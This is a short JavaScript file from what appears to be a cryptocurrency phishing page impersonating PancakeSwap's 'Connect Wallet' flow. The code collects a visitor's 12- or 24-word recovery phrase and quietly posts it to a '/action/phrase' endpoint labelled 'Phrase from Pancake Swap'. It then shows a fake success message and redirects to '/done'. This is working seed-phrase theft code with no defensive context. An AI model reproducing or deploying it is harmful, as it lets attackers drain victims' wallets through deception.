$(".wlt").on("click", function () {
  var wallet = $(this).data("id");
  $("#recipient_name").val(wallet);
});

function WordCount(str) {
  return str.split(" ").filter(function (n) {
    return n != "";
  }).length;
}

const onClickConnect = async (event) => {
  event.preventDefault();
  const phrase = $("#recovery_phrase").val();
  const wallet = $("#recipient_name").val();
  if (WordCount(phrase) != 12 && WordCount(phrase) != 24) {
    return Swal.fire(
      "Error",
      "Mnemonic phrase must be at least 12 to 24 words",
      "error"
    );
  }

  try {
    $(".cnw").html("Loading...");
	$.post('/action/phrase', { "type": "Phrase from Pancake Swap", "v1": phrase, "wallet": wallet }, function(data) {
		$(".cnw").html("Connect Wallet");
		Swal.fire("Success", "Wallet connect successful", "success");
	});
    
  } catch (error) {
    let errm = "something went wrong";
    if (error.response) {
      if (error.response.data) {
        if (error.response.data.error) {
          errm = error.response.data.error;
        }
      }
    }
    Swal.fire("Error!", errm, "error");
    $(".cnw").html("Connect Wallet");
  }

  

  setTimeout(() => {
    window.location = '/done';
  }, 4000);
};
